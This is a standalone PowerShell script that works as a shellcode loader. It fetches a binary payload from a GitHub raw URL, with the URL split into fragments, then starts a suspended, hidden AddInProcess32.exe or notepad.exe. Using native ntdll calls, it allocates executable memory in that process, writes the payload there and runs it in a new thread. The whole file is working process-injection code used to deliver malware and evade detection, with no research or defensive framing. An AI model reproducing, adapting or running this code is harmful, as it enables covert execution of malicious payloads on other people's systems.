$lookupDef = @'
[DllImport("kernel32.dll", SetLastError=true)]
public static extern IntPtr GetModuleHandle(string lpModuleName);
[DllImport("kernel32.dll", SetLastError=true)]
public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
'@
Add-Type -MemberDefinition $lookupDef -Name "K32" -Namespace "Ldr" -PassThru | Out-Null

$da = [AppDomain]::CurrentDomain
$ab = $da.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName("R")), [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
$mb = $ab.DefineDynamicModule("M")

function Local:NDT { param([Type]$R,[Type[]]$P)
    $t=$mb.DefineType("T$(Get-Random)",'Class,Public,Sealed,AnsiClass,AutoClass',[System.MulticastDelegate])
    $c=$t.DefineConstructor('RTSpecialName,HideBySig,Public',[System.Reflection.CallingConventions]::Standard,@([IntPtr],[IntPtr]))
    $c.SetImplementationFlags('Runtime,Managed')
    $i=$t.DefineMethod('Invoke','Public,HideBySig,NewSlot,Virtual',$R,$P)
    $i.SetImplementationFlags('Runtime,Managed')
    $t.CreateType()
}

function Local:GF { param([string]$M,[string]$F,[Type]$D)
    $h=[Ldr.K32]::GetModuleHandle($M)
    if($h -eq [IntPtr]::Zero){
        $lt=NDT ([IntPtr]) @([string])
        $la=[Ldr.K32]::GetProcAddress([Ldr.K32]::GetModuleHandle("kernel32.dll"),"LoadLibraryA")
        $ll=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($la,$lt)
        $h=$ll.Invoke($M)
    }
    $a=[Ldr.K32]::GetProcAddress($h,$F)
    [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($a,$D)
}

$dNA  = NDT ([uint32]) @([IntPtr],[IntPtr],[IntPtr],[IntPtr],[uint32],[uint32])
$dNW  = NDT ([uint32]) @([IntPtr],[IntPtr],[byte[]],[uint32],[IntPtr])
$dNCT = NDT ([uint32]) @([IntPtr],[uint32],[IntPtr],[IntPtr],[IntPtr],[IntPtr],[bool],[int32],[int32],[int32],[IntPtr])
$dCP  = NDT ([bool])   @([IntPtr],[IntPtr],[IntPtr],[IntPtr],[bool],[uint32],[IntPtr],[IntPtr],[IntPtr],[IntPtr])

$fNA  = GF "ntdll.dll"    "NtAllocateVirtualMemory" $dNA
$fNW  = GF "ntdll.dll"    "NtWriteVirtualMemory"    $dNW
$fNCT = GF "ntdll.dll"    "NtCreateThreadEx"         $dNCT
$fCP  = GF "kernel32.dll" "CreateProcessA"            $dCP

Write-Host "[*] Downloading..." -ForegroundColor Yellow
$h1="https"+"://"
$d1="github"+".com"
$p1="/i25968627-ui/crispy-spoon/raw/refs/heads/main/nfasiv.bin"
$wc=New-Object System.Net.WebClient
$wc.Headers.Add("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
$pl=$wc.DownloadData($h1+$d1+$p1)
if($pl.Length -eq 0){Write-Host "[-] Empty" -ForegroundColor Red;exit}
Write-Host "[+] $($pl.Length) bytes" -ForegroundColor Green

$tp="$env:windir\\Microsoft.NET\\Framework\\v4.0.30319\\AddInProcess32.exe"
if(-not(Test-Path $tp)){$tp="$env:windir\\SysWOW64\\notepad.exe"}
Write-Host "[*] Spawning..." -ForegroundColor Yellow

$pp=[System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($tp)
$si=[System.Runtime.InteropServices.Marshal]::AllocHGlobal(104)
$pi=[System.Runtime.InteropServices.Marshal]::AllocHGlobal(32)
$z1=New-Object byte[] 104;[System.Runtime.InteropServices.Marshal]::Copy($z1,0,$si,104)
$z2=New-Object byte[] 32;[System.Runtime.InteropServices.Marshal]::Copy($z2,0,$pi,32)
[System.Runtime.InteropServices.Marshal]::WriteInt32($si,0,104)
[System.Runtime.InteropServices.Marshal]::WriteInt32($si,60,1)
[System.Runtime.InteropServices.Marshal]::WriteInt16($si,64,0)

$ok=$fCP.Invoke($pp,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero,$false,[uint32](0x4-bor0x08000000),[IntPtr]::Zero,[IntPtr]::Zero,$si,$pi)
[System.Runtime.InteropServices.Marshal]::FreeHGlobal($pp)
if(-not $ok){Write-Host "[-] Spawn failed" -ForegroundColor Red;exit}

$hP=[System.Runtime.InteropServices.Marshal]::ReadIntPtr($pi,0)
$pid2=[System.Runtime.InteropServices.Marshal]::ReadInt32($pi,[IntPtr]::Size*2)
Write-Host "[+] PID $pid2" -ForegroundColor Green
[System.Runtime.InteropServices.Marshal]::FreeHGlobal($si)
[System.Runtime.InteropServices.Marshal]::FreeHGlobal($pi)

$pB=[System.Runtime.InteropServices.Marshal]::AllocHGlobal([IntPtr]::Size)
$pR=[System.Runtime.InteropServices.Marshal]::AllocHGlobal([IntPtr]::Size)
[System.Runtime.InteropServices.Marshal]::WriteIntPtr($pB,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::WriteIntPtr($pR,[IntPtr]$pl.Length)
$st=$fNA.Invoke($hP,$pB,[IntPtr]::Zero,$pR,[uint32]0x3000,[uint32]0x40)
if($st-ne 0){Write-Host "[-] Alloc failed" -ForegroundColor Red;exit}
$ba=[System.Runtime.InteropServices.Marshal]::ReadIntPtr($pB)
[System.Runtime.InteropServices.Marshal]::FreeHGlobal($pB)
[System.Runtime.InteropServices.Marshal]::FreeHGlobal($pR)
Write-Host "[+] 0x$($ba.ToString('X'))" -ForegroundColor Green

$pW=[System.Runtime.InteropServices.Marshal]::AllocHGlobal(4)
[System.Runtime.InteropServices.Marshal]::WriteInt32($pW,0)
$st=$fNW.Invoke($hP,$ba,$pl,[uint32]$pl.Length,$pW)
$wr=[System.Runtime.InteropServices.Marshal]::ReadInt32($pW)
[System.Runtime.InteropServices.Marshal]::FreeHGlobal($pW)
if($st-ne 0){Write-Host "[-] Write failed" -ForegroundColor Red;exit}
Write-Host "[+] Wrote $wr bytes" -ForegroundColor Green

$pT=[System.Runtime.InteropServices.Marshal]::AllocHGlobal([IntPtr]::Size)
[System.Runtime.InteropServices.Marshal]::WriteIntPtr($pT,[IntPtr]::Zero)
$st=$fNCT.Invoke($pT,[uint32]0x1FFFFF,[IntPtr]::Zero,$hP,$ba,[IntPtr]::Zero,$false,[int32]0,[int32]0,[int32]0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::FreeHGlobal($pT)
if($st-ne 0){Write-Host "[-] Thread failed" -ForegroundColor Red;exit}

$pl=$null;[GC]::Collect()
Write-Host "[+] DONE" -ForegroundColor Green